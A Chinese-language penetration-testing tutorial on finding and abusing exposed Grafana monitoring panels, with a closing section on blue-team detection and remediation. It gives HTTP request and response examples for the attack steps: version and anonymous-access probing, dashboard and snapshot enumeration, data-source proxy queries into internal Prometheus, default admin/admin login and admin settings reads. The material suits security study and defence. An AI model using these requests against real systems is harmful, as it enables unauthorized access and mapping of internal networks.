---
title: "Grafana监控面打点与接口利用技术"
date: 2026-06-13T13:56:17+08:00
draft: false
weight: 48
description: "围绕Grafana相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "Grafana"]
---

# Grafana监控面打点与接口利用技术

`Grafana` 在渗透测试里属于典型的高价值监控面。它的风险不在于“只是一个看图表的页面”，而在于它天然连接着大量内部数据源和基础设施：

- Prometheus
- Loki
- Elasticsearch
- InfluxDB
- MySQL / PostgreSQL
- 云监控接口
- 内部 HTTP API

一旦 Grafana 被错误暴露、匿名访问过宽、默认口令未改、数据源权限配置过松，攻击者很容易从一个看似普通的监控页面，继续获得：

- 内部资产清单
- 数据源地址与访问路径
- Dashboard 中嵌入的密钥与查询逻辑
- 代理查询能力
- 对内部网络和内部 API 的间接探测能力

本文继续按你当前的目录要求整理，重点只放在 `04 渗透攻击` 所需的“打点与漏洞利用”侧，不延伸后渗透横向，内容包括：

1. 如何识别 Grafana 管理/监控面
2. 匿名与弱鉴权状态下能读到什么
3. 如何通过 Dashboard、数据源、Snapshot、API 做精确打点
4. 哪些请求和响应最值得记录
5. 蓝队如何从访问日志与 Grafana 自身日志中识别这类利用

---

## 0. 攻击面概览

### 0.1 为什么 Grafana 适合做“打点专题”

Grafana 和普通业务后台不同，它的核心价值不在业务逻辑，而在“聚合可观测性与基础设施元数据”。这意味着攻击者访问 Grafana 后，看到的通常不是单一页面，而是一整套环境索引：

- 哪些业务系统存在
- 哪些集群存在
- 哪些数据源存在
- 哪些告警规则存在
- 哪些查询语句暴露了内部结构

对渗透测试来说，这种资产特别适合做打点方法学，因为它能帮助你迅速完成：

- 资产画像
- 内网地址收集
- 凭据线索回收
- SSRF / 代理测试
- 监控接口链式利用判断

### 0.2 常见路径

首轮至少要枚举：

- `/login`
- `/api/health`
- `/api/frontend/settings`
- `/api/org`
- `/api/user`
- `/api/search`
- `/api/datasources`
- `/api/dashboards/home`
- `/api/dashboards/uid/:uid`
- `/api/snapshots`
- `/api/annotations`
- `/public/build/`

如果前端 UI 可见，还应注意：

- `/d/<uid>/<slug>`
- `/dashboard/snapshot/<key>`

### 0.3 打点收益优先级

以“最快获得真实攻击价值”为标准，Grafana 的打点收益通常可以这样排：

1. 确认匿名访问与版本信息
2. 枚举 Dashboard 和 Folder
3. 枚举 Data Source 与 Query 入口
4. 回收 Snapshot 与 Query 历史线索
5. 测试 Data Source Proxy / 内部 API 间接访问

---

## 1. 第一轮打点：确认是否为 Grafana

### 1.1 登录页识别

#### 请求示例

```http
GET /login HTTP/1.1
Host: monitor.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: grafana_session=3e928f...; Path=/; HttpOnly
X-Frame-Options: deny
```

页面正文里常见特征：

- `Grafana`
- `Welcome to Grafana`
- `grafanaBootData`

如果前端被代理或做了白标，页面标题可能被改写，但静态资源路径、Cookie 名、接口响应结构往往仍能把它识别出来。

### 1.2 健康检查接口

#### 请求示例

```http
GET /api/health HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "commit": "abc123def",
  "database": "ok",
  "version": "10.4.1"
}
```

这条响应本身已经非常有价值，因为它直接告诉你：

- 后端是否正常
- 版本号
- 是否值得继续结合历史已知漏洞或弱配置去测

### 1.3 前端设置接口

Grafana 的前端设置接口在打点中非常有用，因为它常常会暴露：

- 是否允许匿名访问
- 登录方式
- 组织名
- 默认主页
- 插件或特性开关

#### 请求示例

```http
GET /api/frontend/settings HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "buildInfo": {
    "version": "10.4.1",
    "commit": "abc123def"
  },
  "appSubUrl": "",
  "datasources": {},
  "anonymousEnabled": true,
  "defaultDatasource": "Prometheus"
}
```

这一类响应最值得记录的是：

- `anonymousEnabled`
- 版本信息
- 默认数据源

因为这三个字段会直接决定你后续应该优先走：

- 匿名 Dashboard 读取
- 数据源打点
- 登录页口令测试

---

## 2. 第二轮打点：匿名访问和弱鉴权的真实收益

### 2.1 判断当前身份

#### 请求示例

```http
GET /api/user HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例：匿名可读

```json
{
  "id": 0,
  "isGrafanaAdmin": false,
  "isAnonymous": true,
  "orgId": 1,
  "orgName": "Main Org.",
  "orgRole": "Viewer",
  "login": ""
}
```

这条响应对打点非常关键，因为它清楚说明：

- 匿名访问已被允许
- 匿名用户属于哪个组织
- 匿名用户在组织中的权限级别是什么

如果 `orgRole=Viewer`，攻击者后续通常就会继续尝试：

- Dashboard 搜索
- Dashboard JSON 读取
- Snapshot 枚举
- Data Source 相关接口

### 2.2 搜索 Dashboard 与 Folder

#### 请求示例

```http
GET /api/search?query=&type=dash-db HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": 2,
    "uid": "a1b2c3d4",
    "title": "Kubernetes Production",
    "uri": "db/kubernetes-production",
    "type": "dash-db",
    "folderTitle": "Operations"
  },
  {
    "id": 8,
    "uid": "n9m8k7j6",
    "title": "Jenkins Deploy Metrics",
    "uri": "db/jenkins-deploy-metrics",
    "type": "dash-db",
    "folderTitle": "CI"
  }
]
```

这类响应会立刻暴露：

- 真实业务环境名称
- 集群、组件、CI/CD 系统、数据库、消息队列等资产线索
- 哪些面板最值得继续深挖

从攻击者视角看，这一步几乎就是“内网监控资产目录”。

### 2.3 读取 Dashboard 详情

#### 请求示例

```http
GET /api/dashboards/uid/a1b2c3d4 HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "meta": {
    "canSave": false,
    "canEdit": false,
    "slug": "kubernetes-production"
  },
  "dashboard": {
    "title": "Kubernetes Production",
    "panels": [
      {
        "title": "API Server Health",
        "datasource": {
          "type": "prometheus",
          "uid": "prom-main"
        },
        "targets": [
          {
            "expr": "up{job=\"apiserver\",cluster=\"prod-cluster-a\"}"
          }
        ]
      }
    ]
  }
}
```

这类响应的价值远大于“看图表”本身，因为它会泄露：

- 数据源 UID
- 指标查询语句
- 业务集群名称
- 内部服务命名
- 监控标签结构

如果查询语句中出现：

- `instance`
- `job`
- `cluster`
- `namespace`
- `pod`
- `service`

那么它就能直接帮助你还原内部资产命名体系。

---

## 3. 第三轮打点：数据源与代理能力

Grafana 的真正高风险点之一，不是图表，而是数据源。

### 3.1 枚举 Data Source

#### 请求示例

```http
GET /api/datasources HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": 1,
    "uid": "prom-main",
    "orgId": 1,
    "name": "Prometheus-Prod",
    "type": "prometheus",
    "access": "proxy",
    "url": "http://prometheus.monitoring.svc.cluster.local:9090",
    "isDefault": true,
    "jsonData": {
      "httpMethod": "POST"
    },
    "secureJsonFields": {}
  },
  {
    "id": 2,
    "uid": "es-log",
    "name": "Elastic-Logs",
    "type": "elasticsearch",
    "access": "proxy",
    "url": "http://elasticsearch.logging.svc:9200"
  }
]
```

这类响应非常关键，因为它会直接暴露：

- 内部服务地址
- 数据源类型
- 是否走 `proxy`
- 默认数据源

就算看不到明文密码，单是这些地址就足以帮助你构建更完整的内网资产图。

### 3.2 为什么 `access=proxy` 很值得继续测

`access=proxy` 意味着：

- 前端查询并不是浏览器直接访问数据源
- 而是 Grafana 服务器代为访问后端数据源

从打点角度看，这意味着 Grafana 可能成为：

- 对内部 Prometheus 的间接查询入口
- 对内部 Elasticsearch 的间接读取入口
- 对其它 HTTP 类数据源的代理访问点

### 3.3 Data Source Proxy 请求

不同版本与不同数据源插件的路径略有差异，但常见模式是通过数据源代理接口把请求转发到实际数据源。

#### 请求示例

```http
GET /api/datasources/proxy/1/api/v1/label/__name__/values HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": [
    "apiserver_request_total",
    "container_cpu_usage_seconds_total",
    "etcd_server_has_leader",
    "kube_node_info"
  ]
}
```

这条响应说明：

- 你已经不只是“看 Grafana 页面”
- 而是借助 Grafana 代理直接在查询 Prometheus

这类能力在打点阶段非常有价值，因为它可以继续扩展为：

- 资产和命名空间枚举
- Kubernetes 节点、Pod、服务识别
- 内部监控标签体系还原

### 3.4 继续打内部标签与实例

#### 请求示例

```http
GET /api/datasources/proxy/1/api/v1/series?match[]=up HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": [
    {
      "__name__": "up",
      "instance": "10.10.20.15:9100",
      "job": "node-exporter"
    },
    {
      "__name__": "up",
      "instance": "10.10.30.8:8080",
      "job": "jenkins"
    }
  ]
}
```

这一步的打点收益已经非常直接：

- 还原内网 IP
- 发现服务端口
- 把监控名与真实主机对应起来

---

## 4. 第四轮打点：Dashboard、Snapshot 与查询逻辑中的敏感信息

### 4.1 Dashboard JSON 中的密钥线索

一些 Grafana 面板不会直接把密码明文写出来，但经常会泄露：

- 内部 URL
- Bearer 头字段名
- 环境名
- 查询模板变量
- 内部 API 路径

#### 响应片段示例

```json
{
  "templating": {
    "list": [
      {
        "name": "namespace",
        "query": "label_values(kube_pod_info, namespace)"
      }
    ]
  },
  "panels": [
    {
      "title": "Internal API Error Rate",
      "targets": [
        {
          "expr": "sum(rate(http_requests_total{service=\"internal-gateway\"}[5m]))"
        }
      ]
    }
  ]
}
```

这些信息会帮助攻击者快速判断：

- 目标环境是否基于 K8s
- 是否存在 `internal-gateway`
- 哪些服务最值得继续找公开入口

### 4.2 Snapshot 打点

Grafana 的 Snapshot 功能会把某些 Dashboard 以快照形式暴露出来，这类对象常常具备额外价值：

- 快照可公开访问
- 快照可能保留数据点与可视化结果
- 某些环境快照路径可被外部枚举或长期保存

#### 请求示例：创建快照能力探测

```http
GET /api/snapshots HTTP/1.1
Host: monitor.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": 15,
    "name": "prod-k8s-overview",
    "key": "S9kzT1dRk",
    "deleteKey": "6JvYq3pLm"
  }
]
```

这类响应一旦出现，就意味着：

- 快照接口可能可读
- 快照键值可能被外部使用
- 后续应立即访问快照内容查看是否包含敏感图表和标题

#### 请求示例：访问快照

```http
GET /dashboard/snapshot/S9kzT1dRk HTTP/1.1
Host: monitor.target.example
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

如果前端页面能直接打开，就说明快照已经成为一个独立的公开情报面。

---

## 5. 第五轮打点：默认口令、弱口令与登录后 API

Grafana 的另一个老问题是默认账户或弱口令。虽然单纯的默认口令不算“技巧”，但在打点专题中必须把登录后 API 收益写清楚，因为一旦登录成功，Grafana 的价值会迅速放大。

### 5.1 登录请求

#### 请求示例

```http
POST /login HTTP/1.1
Host: monitor.target.example
Content-Type: application/json
Accept: application/json
Connection: close

{
  "user": "admin",
  "password": "admin"
}
```

#### 典型成功响应示例

```json
{
  "message": "Logged in"
}
```

以及响应头中出现：

```http
Set-Cookie: grafana_session=7bbfe1...; Path=/; HttpOnly
```

#### 典型失败响应示例

```json
{
  "message": "Invalid username or password"
}
```

如果登录成功，后续的 API 收益通常包括：

- 枚举全部 Dashboard
- 枚举 Data Source
- 读取更多配置细节
- 使用组织内 Viewer / Editor 权限做更深的打点

### 5.2 登录后读取组织信息

#### 请求示例

```http
GET /api/org HTTP/1.1
Host: monitor.target.example
Cookie: grafana_session=7bbfe1...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "id": 1,
  "name": "Main Org."
}
```

这类接口看似简单，但对打点很重要，因为：

- 你可以确认会话是否真的生效
- 你可以判断后续所有数据源和 Dashboard 是属于哪个组织

### 5.3 登录后读取设置或高权限接口

如果拿到的是管理员身份，价值会进一步抬升。

#### 请求示例

```http
GET /api/admin/settings HTTP/1.1
Host: monitor.target.example
Authorization: Basic YWRtaW46QWRtaW4xMjMh
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "auth.anonymous": {
    "enabled": "true",
    "org_role": "Viewer"
  },
  "database": {
    "type": "sqlite3",
    "path": "/var/lib/grafana/grafana.db"
  },
  "security": {
    "admin_user": "admin",
    "secret_key": "************"
  },
  "smtp": {
    "host": "mail.internal.local:25",
    "user": "alerts"
  }
}
```

官方文档明确说明 Admin API 需要 Grafana server admin 权限并使用 Basic Auth。这类接口一旦可用，打点价值极高，因为会直接暴露：

- 匿名访问配置
- 数据库类型与路径
- 邮件、认证、LDAP、SAML 等集成线索
- 整体安全配置面

---

## 6. 打点流程建议

比起一上来盲测所有接口，更有效的 Grafana 打点流程通常如下：

### 6.1 第一轮：识别与匿名性判断

优先请求：

- `/login`
- `/api/health`
- `/api/frontend/settings`
- `/api/user`

目标：

- 确认是不是 Grafana
- 识别版本
- 判断匿名访问是否启用

### 6.2 第二轮：枚举 Dashboard 与资产线索

优先请求：

- `/api/search`
- `/api/dashboards/uid/:uid`
- `/dashboard/snapshot/:key`

目标：

- 识别业务系统、集群、组件
- 收集 Dashboard 中的查询表达式和内部命名

### 6.3 第三轮：枚举 Data Source

优先请求：

- `/api/datasources`
- `/api/datasources/proxy/:id/...`

目标：

- 暴露内网地址
- 判断是否存在代理型查询面
- 识别 Prometheus / ES / Loki / InfluxDB 等后端

### 6.4 第四轮：登录后收益验证

在弱口令、默认口令或其他身份来源成立后，再继续：

- `/api/org`
- `/api/user`
- `/api/datasources`
- `/api/admin/settings`

目标：

- 验证权限级别
- 确认是否可访问更高价值 API

---

## 7. 蓝队检测与处置

### 7.1 访问日志中的高价值信号

应重点识别：

- 对 `/api/health`、`/api/frontend/settings` 的探测
- 非运维来源对 `/api/search` 的批量访问
- 对 `/api/datasources` 和 `/api/datasources/proxy/` 的访问
- 对快照接口的枚举与访问
- 短时间内从匿名探测转入登录尝试

#### 日志示例

```text
10.10.10.21 - - [12/Jun/2026:23:42:11 +0800] "GET /api/health HTTP/1.1" 200 58 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [12/Jun/2026:23:42:15 +0800] "GET /api/search?query=&type=dash-db HTTP/1.1" 200 843 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [12/Jun/2026:23:42:23 +0800] "GET /api/datasources/proxy/1/api/v1/label/__name__/values HTTP/1.1" 200 1672 "-" "curl/8.7.1"
```

第三条日志尤其重要，因为它意味着攻击者已经不只是查看 UI，而是在借用 Grafana 代理内部数据源。

### 7.2 Grafana 应用日志中的调查点

Grafana 自身日志往往能看到：

- 登录成功/失败
- API 调用
- Data Source Proxy 请求
- 管理 API 调用

#### 日志示例

```text
logger=context userId=0 orgId=1 uname= t=2026-06-12T23:42:15+08:00 level=info msg="Request Completed" method=GET path=/api/search status=200 remote_addr=10.10.10.21 time_ms=12 size=843
```

```text
logger=context userId=0 orgId=1 uname= t=2026-06-12T23:42:23+08:00 level=info msg="Request Completed" method=GET path=/api/datasources/proxy/1/api/v1/label/__name__/values status=200 remote_addr=10.10.10.21 time_ms=41 size=1672
```

如果日志中 `userId=0` 或匿名用户能执行数据源代理请求，这通常已经属于高优先级风险。

### 7.3 处置建议

发现 Grafana 正在被打点后，应优先做：

1. 关闭匿名访问或将匿名权限降到最小
2. 检查哪些 Dashboard 和数据源对匿名或低权限用户可见
3. 审核 Data Source Proxy 权限
4. 下线公开快照或清理历史快照
5. 检查默认口令、弱口令与本地管理员账户
6. 检查是否已有通过 Grafana 暴露的内网资产被继续访问

长期建议：

- 不在公网暴露 Grafana
- 严格限制匿名访问
- 对敏感 Dashboard 单独做权限控制
- 限制数据源查询权限与代理能力
- 对 `/api/datasources` 与 `/api/datasources/proxy/*` 建立专门告警

---

## 8. 复盘清单

### 8.1 红队侧

- 是否先确认了匿名访问与版本信息
- 是否记录了 `/api/search` 的 Dashboard 返回结果
- 是否枚举并记录了 Data Source 的 UID、类型、URL、access 模式
- 是否验证了 Data Source Proxy 的实际响应
- 是否把 Dashboard 查询表达式转化成资产线索

### 8.2 蓝队侧

- 是否能识别匿名用户访问 Grafana API
- 是否能识别 Data Source Proxy 被外部来源调用
- 是否能关联快照访问、Dashboard 枚举和登录尝试
- 是否能从日志中区分普通查看与数据源代理查询

### 8.3 应急侧

- 是否确认敏感 Dashboard 是否已被读取
- 是否确认数据源是否被间接查询
- 是否完成默认口令和管理员账户审计
- 是否清理了快照与匿名访问配置

---

## 9. 总结

`Grafana` 在渗透测试里的真正风险，不是“一个监控大盘能不能看见”，而是它经常充当了内部基础设施的观察和代理入口。

对打点来说，Grafana 的方法学价值在于：

- 先识别匿名与版本
- 再枚举 Dashboard
- 再提取 Data Source
- 再借代理接口去确认内部资产与监控面

这种路线非常适合沉淀在 `04 渗透攻击` 目录中，因为它本质上解决的是“如何从一个公开监控面迅速收集并放大攻击收益”。

---

## 参考资料

- [Grafana Data Source HTTP API](https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/data_source/)
- [Grafana Admin HTTP API](https://grafana.com/docs/grafana/latest/developers/http_api/admin/)
- [Grafana Dashboard HTTP API](https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/dashboard/)
- [Hackviser: Grafana Pentesting Notes](https://hackviser.com/tactics/pentesting/services/grafana)
